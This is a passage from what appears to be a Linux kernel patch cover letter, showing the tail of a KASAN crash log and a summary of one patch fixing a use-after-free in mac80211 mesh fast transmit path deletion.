[   25.716200] ---[ end Kernel panic - not syncing: KASAN: panic_on_warn set ... ]---
-----END crash log-----

Best regards,
Zihan Xi

Zihan Xi (1):
  wifi: mac80211: fix mesh fast xmit path deletion UAF

 net/mac80211/mesh_pathtbl.c | 9 +++++++++
 1 file changed, 9 insertions(+)

-- 
2.43.0

